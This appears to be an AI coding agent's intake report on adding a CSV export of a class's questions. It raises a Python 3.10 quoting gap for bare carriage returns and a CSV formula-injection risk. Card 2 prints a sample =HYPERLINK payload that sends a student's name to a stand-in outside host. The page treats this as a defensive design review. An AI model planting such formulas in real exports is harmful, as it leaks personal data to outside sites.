@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>B-T2 contract amendment</title>
+<style>
+body{font:15px/1.5 -apple-system,system-ui,sans-serif;margin:0;padding:16px;color:#1d1d1f;background:#fff;max-width:820px}
+.strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:6px;margin-bottom:18px}
+.strip div{border:1px solid #ddd;border-radius:8px;padding:8px}
+.strip b{display:block;font-size:11px;text-transform:uppercase;color:#666;letter-spacing:.04em}
+.strip .you{background:#fff6c2;border-color:#e6c800}
+h1{font-size:20px;margin:0 0 4px}h2{font-size:17px;margin:26px 0 6px}
+.card{border:1px solid #ccc;border-radius:10px;padding:12px;margin:12px 0}
+.opt{border-left:4px solid #bbb;padding:6px 10px;margin:8px 0;background:#fafafa}
+.rec{border-left-color:#1a7f37;background:#f0faf2}
+code,pre{font:13px ui-monospace,Menlo,monospace;background:#f3f3f3;border-radius:4px}
+code{padding:1px 4px}pre{padding:8px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.tag{font-size:12px;padding:1px 6px;border-radius:10px;background:#eee}
+small{color:#555}
+</style></head><body>
+
+<div class="strip">
+ <div><b>Status</b>Intake done. Stopped before Plan/Build.</div>
+ <div class="you"><b>From you</b>Two answers: card 1 (A/B) and card 2 (A/B). Or "go with your picks".</div>
+ <div><b>Risk</b>Medium by the rules (new <code>src/lab/export.py</code> + tests). Read-only SQL, no schema.</div>
+ <div><b>Updated</b>2026-11-20</div>
+</div>
+
+<h1>Issue #4: export a class's questions as CSV</h1>
+<p>This ticket <b>ends in a pull request</b> (build, not spike). Stage: <b>Intake</b> &rarr; waiting at Stop 1 before <b>Plan</b>.</p>
+
+<p>I checked the contract against <code>origin/main</code>. Almost all of it holds (see the bottom). Two things need your word before I build, because building exactly what is written either contradicts itself or carries a risk the contract does not mention.</p>
+
+<div class="card">
+<h2 style="margin-top:0">Card 1. A lone carriage return (<code>\r</code>) is not quoted on CI's Python</h2>
+<p><b>What is wrong.</b> Decisions says two things that disagree in one case: "a field is wrapped in double quotes only if it contains a comma, a double quote or a <b>line break</b>", and "Quoting is Python's <code>csv</code> module default". CI runs Python <b>3.10</b> (<code>UV_PYTHON: "3.10"</code> in <code>ci.yml</code>). On 3.10, <code>csv.writer(buf, lineterminator="\n")</code> does <b>not</b> quote a field holding a bare <code>\r</code>; on 3.11, 3.12 and 3.13 it does. <span class="tag">Builder says: I ran all four versions</span></p>
+<p><b>Example from this codebase.</b> <code>ask_question</code> only strips the ends of the text, so a question pasted as <code>Line one\rline two</code> is stored with the <code>\r</code> inside. On CI's Python the export row comes out as:</p>
+<pre>5,Ada,2026-03-01T09:20:00,Line one\rline two,</pre>
+<p>A spreadsheet treats that <code>\r</code> as a new row, so the row splits in two and every column after it shifts. On Python 3.11+ the same call gives <code>"Line one\rline two"</code> (quoted, safe). So the same code gives different files depending on the Python version.</p>
+<div class="opt rec"><b>A (recommended). Quote any field that holds <code>\r</code> or <code>\n</code>, on every Python version.</b> Text stays exactly as stored. Matches the "line break" rule and what Python 3.11+ does already. Before (3.10): <code>Line one\rline two</code> &rarr; after: <code>"Line one\rline two"</code>. Every other case, including the worked example, is byte-for-byte unchanged.<br><small>Amended Decisions line: "&hellip; a field is wrapped in double quotes only if it contains a comma, a double quote or a line break (<code>\n</code> or <code>\r</code>), on every supported Python version; this is <code>csv.writer</code>'s default on Python 3.11+."</small><br>Then: I build it with a test named for it that runs on CI's 3.10.</div>
+<div class="opt"><b>B. Keep "whatever <code>csv.writer</code> does" literally.</b> Simplest code (the three lines in the Notes). Before and after: on 3.10 a bare <code>\r</code> stays unquoted and can split a row.<br>Then: I build as written and list the <code>\r</code> case under "Not handled" in the merge brief.</div>
+</div>
+
+<div class="card">
+<h2 style="margin-top:0">Card 2. Student text that starts with <code>=</code> runs as a formula in the teacher's spreadsheet</h2>
+<p><b>What the contract misses.</b> The export holds text typed by students, and the whole point is that teachers open it in a spreadsheet. Excel and Google Sheets treat a cell that starts with <code>=</code>, <code>+</code>, <code>-</code> or <code>@</code> as a formula (known as "CSV injection"). The contract says the question column is the text as stored, so the export passes it straight through.</p>
+<p><b>Example.</b> A student in Biology asks <code>=HYPERLINK("https://example.com/?"&amp;B2,"Click for the answer")</code>. Today's contract exports:</p>
+<pre>5,Ada,2026-03-01T09:20:00,"=HYPERLINK(""https://example.com/?""&amp;B2,""Click for the answer"")",</pre>
+<p>Opened in a spreadsheet, that cell is a live link that would send another cell's contents (here a student's name) to an outside site when clicked. Most spreadsheets show a warning for the worst forms, but not for all.</p>
+<div class="opt rec"><b>A (recommended). Build as signed now; I draft a follow-up issue for you to approve at Stop 2.</b> The export is exact text, so it is honest about what students typed and keeps this ticket to its scope. The risk exists only once a teacher opens the file in a spreadsheet, and the fix choice (prefix with <code>'</code>, or warn) deserves its own triage.<br>Then: the merge brief names this risk and shows the follow-up issue text for your yes.</div>
+<div class="opt"><b>B. Neutralise it in this ticket.</b> Any field starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab or <code>\r</code> gets a leading <code>'</code>. Before: <code>=HYPERLINK(...)</code> &rarr; after: <code>'=HYPERLINK(...)</code>. Cost: a genuine question like <code>-5 squared?</code> exports as <code>'-5 squared?</code>, and the Decisions line "question = the question text" changes.<br><small>Amended Decisions line: "Any field whose first character is <code>= + - @</code>, tab or <code>\r</code> is prefixed with a single quote <code>'</code>."</small><br>Then: I build it with a test per prefix character.</div>
+</div>
+
+<h2>Checked and fine (no change needed)</h2>
+<ul>
+<li>Worked example: I played it through <code>csv.writer(lineterminator="\n")</code>; the expected string is right, byte for byte, including <code>"What does ""ATP"" mean?"</code> and the trailing commas for no answer. <span class="tag">Builder says</span></li>
+<li>Schema matches the Decisions: <code>questions.hidden</code>, <code>questions.asked_at</code> (text), <code>students.name</code>, <code>answers.question_id</code> unique (one answer per question at most). No migration needed. <span class="tag">Builder says</span></li>
+<li><code>get_class</code> raises <code>LookupError("no class with id …")</code>; reusing it gives the unknown-class rule without changing it. <span class="tag">Builder says</span></li>
+<li>Must not change lines are all true today (no export exists, so nothing hidden is exported). Scope Out is consistent with Scope In. <span class="tag">Builder says</span></li>
+<li>Small slip, not in the contract sections: "Done when" says the worked example is "in Notes"; it is in Examples of done (Notes says so itself). No action.</li>
+</ul>
+
+<h2>Defaults I will use (no answer needed)</h2>
+<ul>
+<li>One query joining <code>questions</code>, <code>students</code> and <code>answers</code> (left join), <code>hidden = 0</code>, <code>order by q.id</code>. I will <b>not</b> reuse <code>list_questions</code>: it pages, and its offset looks off by one (<code>max(first_row - 1, 0)</code>), so page 2 repeats a row. Not touching it (Must not change); I can draft a follow-up issue for it at Stop 2.</li>
+<li>Tests in a new <code>tests/test_export.py</code>, one per Example of done, named after it, run on Python 3.10 like CI.</li>
+</ul>
+
+<p><b>Reply</b> with e.g. "1A, 2A" (or "go with your picks"). I record your answer as the amended contract in <code>contract.md</code>; I will not edit the issue.</p>
+</body></html>
